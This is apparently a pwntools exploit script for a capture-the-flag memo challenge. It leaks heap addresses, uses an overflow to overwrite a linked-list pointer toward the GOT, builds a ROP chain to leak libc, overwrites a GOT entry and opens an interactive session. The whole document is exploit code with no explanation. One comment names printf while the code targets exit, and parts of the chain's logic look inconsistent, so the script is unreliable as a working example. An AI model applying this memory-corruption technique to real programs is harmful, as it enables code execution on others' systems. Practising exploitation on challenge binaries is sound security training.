from pwn import *

elf = ELF('./chall')
io = process(elf.path)
context.binary = elf

# create 2 memos
io.sendlineafter(b'> ', b'1')
io.recvuntil(b'0x')
memo1 = int(io.recvline().strip(), 16)
io.sendlineafter(b'Content: ', b'test1')
io.sendlineafter(b'> ', b'1')
io.recvuntil(b'0x')
memo2 = int(io.recvline().strip(), 16)
io.sendlineafter(b'Content: ', b'test2')

log.info(f'memo1: {hex(memo1)}')
log.info(f'memo2: {hex(memo2)}')

# edit memo2 next pointer to GOT printf
payload = b'a' * (memo2 - memo1 - 8)
payload += p64(elf.got['exit'] - 8)
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'index: ', b'0')
io.sendlineafter(b'New content: ', payload)

# make rop chain to leak libc
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.main()
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'index: ', b'0')
io.sendlineafter(b'New content: ', rop.chain())

# GOT overwrite
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'index: ', b'2')
io.sendlineafter(b'New content: ', p64(memo1 + 8))

io.sendlineafter(b'> ', b'4')

io.interactive()

